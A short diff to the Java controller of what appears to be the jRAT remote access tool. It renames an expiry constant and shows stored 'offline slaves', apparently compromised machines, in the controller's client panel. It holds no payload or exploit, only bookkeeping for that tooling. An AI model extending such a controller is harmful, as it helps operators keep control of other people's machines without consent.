@@ -3,6 +3,7 @@ package io.jrat.controller.settings;
 import io.jrat.common.crypto.CryptoUtils;
 import io.jrat.common.crypto.KeyUtils;
 import io.jrat.controller.Globals;
+import io.jrat.controller.Main;
 import io.jrat.controller.OfflineSlave;
 
 import java.io.BufferedReader;
@@ -23,7 +24,7 @@ public class StoreOfflineSlaves extends AbstractStorable {
 	
 	private static final List<OfflineSlave> LIST = new ArrayList<OfflineSlave>();
 	private static final StoreOfflineSlaves INSTANCE = new StoreOfflineSlaves();
-	private static final long TTL = 1000L * 60L * 60L * 24L * 7L;
+	private static final long TIME_TO_LIVE = 1000L * 60L * 60L * 24L * 7L; // 1 week
 	
 	public static StoreOfflineSlaves getGlobal() {
 		return INSTANCE;
@@ -59,11 +60,13 @@ public class StoreOfflineSlaves extends AbstractStorable {
 		while ((line = reader.readLine()) != null) {
 			OfflineSlave os = OfflineSlave.fromString(line);
 						
-			if (System.currentTimeMillis() - os.getCreation() > TTL) {
+			if (System.currentTimeMillis() - os.getCreation() > TIME_TO_LIVE) {
 				continue;
 			}
 			
 			LIST.add(os);
+
+			Main.instance.getPanelClients().addSlave(os);
 		}
 		
 		reader.close();
@@ -80,7 +83,7 @@ public class StoreOfflineSlaves extends AbstractStorable {
 				return;
 			}
 		}
-		
+
 		LIST.add(offlineSlave);
 	}
 	
